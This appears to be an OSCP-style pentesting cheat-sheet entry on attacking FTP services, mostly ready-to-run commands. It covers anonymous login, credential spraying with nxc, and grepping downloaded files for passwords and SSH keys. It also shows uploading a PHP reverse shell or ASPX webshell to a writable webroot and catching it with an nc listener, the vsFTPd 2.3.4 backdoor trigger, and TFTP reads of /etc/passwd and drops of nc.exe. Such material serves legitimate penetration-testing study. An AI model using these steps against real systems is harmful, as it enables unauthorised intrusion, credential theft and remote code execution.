title: FTP — Enumeration, Anonymous Access, Credential Reuse, Webshell
body: FTP on an OSCP box is almost always one of four things: anonymous login with files containing creds, anonymous login to a directory that's also the webroot (upload a shell), credential reuse from creds you found elsewhere, or a version-vulnerable FTP daemon. Anonymous is more common than you'd expect — try it before anything else. The writable-webroot path is the fastest shell you'll ever get: one ftp put and you're executing code.
cmd:
# ══════════════════════════════════════════════════
# 1 — DETECT + ANONYMOUS LOGIN (always try first)
# ══════════════════════════════════════════════════
nmap --script ftp-anon,ftp-syst,ftp-bounce -p 21 <IP>
# ftp-anon: Anonymous FTP login allowed → go directly to step 2

ftp <IP>
# Username: anonymous  Password: anonymous  (or blank)
# Also try: ftp / ftp,  guest / guest,  admin / admin

# ══════════════════════════════════════════════════
# 2 — ONCE LOGGED IN: enumerate thoroughly
# ══════════════════════════════════════════════════
ftp> ls -la              # list including hidden files
ftp> pwd                 # where are you on the filesystem?
ftp> binary              # ALWAYS set binary mode before downloading
ftp> passive             # use passive mode if transfers hang
ftp> mget *              # download everything in current dir
ftp> cd ..               # traverse up if permissions allow
ftp> ls -la              # re-list at each level

# ══════════════════════════════════════════════════
# 3 — CREDENTIAL REUSE (have creds from elsewhere)
# ══════════════════════════════════════════════════
# If you found creds in SMB, web app, a config file:
ftp <IP>
# Try those creds — FTP often shares passwords with SSH/web accounts
# Also try variations: user/user, user/pass123, user/company123

# nxc for spray:
nxc ftp <IP> -u users.txt -p passwords.txt

# ══════════════════════════════════════════════════
# 4 — LOOT: what to look for in FTP files
# ══════════════════════════════════════════════════
# After mget * — search everything you pulled:
grep -ri 'password\|passwd\|secret\|key\|cred\|user' . 2>/dev/null
find . -name '*.conf' -o -name '*.ini' -o -name '*.php' -o -name '*.txt' | xargs grep -l 'pass' 2>/dev/null
find . -name '*.bak' -o -name '*.old' -o -name '*.backup' 2>/dev/null
# SSH keys:
find . -name 'id_rsa' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null

# ══════════════════════════════════════════════════
# 5 — WRITABLE + WEBROOT = INSTANT SHELL
# ══════════════════════════════════════════════════
# Test if the FTP dir is writable:
ftp> put test.txt
# If it succeeds → you can write files
# Is it under the webroot? Check the pwd output from step 2:
#   /var/www/html  → Apache/Nginx webroot
#   C:\inetpub\wwwroot → IIS webroot
#   /srv/http,  /usr/share/nginx/html  → other web roots

# If writable AND webroot → upload a webshell:
# On Kali:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit shell.php — set $ip and $port to yours
ftp> binary
ftp> put shell.php
# Start listener: nc -lvnp 443
# Trigger: curl http://<IP>/shell.php

# ASPX for IIS:
cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
ftp> put shell.aspx
# Visit: http://<IP>/shell.aspx

# ══════════════════════════════════════════════════
# 6 — VERSION EXPLOIT
# ══════════════════════════════════════════════════
# Banner grab:
nc -nv <IP> 21                    # read the banner
ftp <IP>                          # VERSION shows at login
# vsFTPd 2.3.4 → backdoor (CVE-2011-2523): try user with :) suffix
#   USER user:)  PASS anything → check if port 6200 opens
searchsploit vsftpd
searchsploit proftpd

# ══════════════════════════════════════════════════
# 7 — TFTP (UDP 69 — often missed)
# ══════════════════════════════════════════════════
# nmap may miss it — scan explicitly:
nmap -sU -p 69 <IP>
# If open: no auth, read/write by default on many configs
tftp <IP>
tftp> get /etc/passwd
tftp> put nc.exe nc.exe           # drop tools directly

# ── FTP LOGS → HIDDEN ADMIN SLUG ──────────────────
# When FTP has log files — grab ALL of them, they leak internal paths:
ftp> mget *.log
ftp> bye
# Search for admin paths / randomised slugs:
grep -hriE '/[a-z0-9]{4,8}/admin|admin_pay|admin_ip|admin_safe' *.log | head -20
# A hit like: /th4o4p/admin_pay.php?action=del
# gives you the randomised admin directory name (th4o4p in this case).
# This is the ONLY reliable way to find SeaCMS admin paths — they're never in wordlists.
warn: Always set binary mode before any transfer — ASCII mode corrupts non-text files silently and you'll waste time debugging a 'broken' executable that's actually a transfer encoding issue. The writable-webroot shell is the fastest path on any box with both FTP and a web service — check if they share a filesystem before spending time on anything else. vsFTPd 2.3.4 is a common OSCP box version — the backdoor requires the :) username trick and checking port 6200 after auth, not a typical exploit script.

choices.label: Found hidden slug in FTP logs — SeaCMS admin panel
Anonymous access — download and hunt for creds
Found SSH key or creds in FTP files
Have creds — trying them on SSH/other services
Need to brute force FTP creds
